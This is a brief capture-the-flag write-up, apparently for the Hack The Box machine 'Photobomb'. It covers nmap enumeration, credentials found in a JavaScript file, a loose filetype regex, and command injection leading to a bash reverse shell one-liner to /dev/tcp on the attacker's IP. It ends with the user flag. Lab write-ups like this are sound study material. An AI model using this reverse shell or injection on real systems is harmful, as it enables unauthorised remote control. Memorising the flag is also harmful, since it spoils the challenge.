# Enumeration
IP: 10.10.11.182
## Nmap
```bash
nmap -sC -sV -oA nmap/photobomb 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.0099s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80
Redirect to `photobomb.htb`. Adding to `/etc/hosts`

`/printer` page when clicking on the link.

Trying to get a random page give a sinatra error.
```bash
Try this:
get '/ihoewroweihr' do
  "Hello World"
end
```

Try an lfi. It removes the `../`.

Looking at the code there is a js file which includes pwd.
`http://pH0t0:b0Mb!@photobomb.htb/printer`

This link signs us in.

# Printer page
Playing with the request shows that there is lose regex on the filetype. 
```ruby
if !filetype.match(/^(png|jpg)/)
```

Things to test for.

injection, try file include. Didn't work. RCE? yep

## RCE
`bash -c 'bash -i >& /dev/tcp/10.10.14.67/9001 0>&1'`

This works!

User flag:
```text
57749eac104584bf2fa7cf68ae8dbbed
```
